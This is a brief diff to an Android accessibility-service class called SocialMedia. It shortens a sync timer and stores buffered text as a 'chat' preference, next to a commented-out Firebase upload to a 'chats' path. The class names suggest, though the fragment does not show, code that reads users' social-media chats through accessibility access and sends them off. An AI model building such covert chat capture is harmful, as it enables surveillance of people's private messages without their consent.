@@ -274,15 +274,16 @@ public class SocialMedia extends AccessibilityService {
         long timeForComparingLastSync = System.currentTimeMillis() / 1000;
         Log.e("lalala", "outside ");
 
-        if (timeForComparingLastSync >= (pref.getLastSync() + (20 * 60))) { // 20 minutes
+        if (timeForComparingLastSync >= (pref.getLastSync() + (10 * 60))) { // 10 minutes
 
             String result = null;
-            str.append(pref.getDeviceid());
+            //str.append(pref.getDeviceid());
             result = String.valueOf(str);
             Log.e("lalala", "from sm " + result);
             // TODO: 16/02/2023
-            //dbRef.child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result))
+            //dbRef.child(aid).child("chats").child(timeStmp()).setValue(Gson().toJson(result));
             pref.setLastSync(timeForComparingLastSync);
+            pref.setChat(result);
             str = new StringBuilder();
         }
 
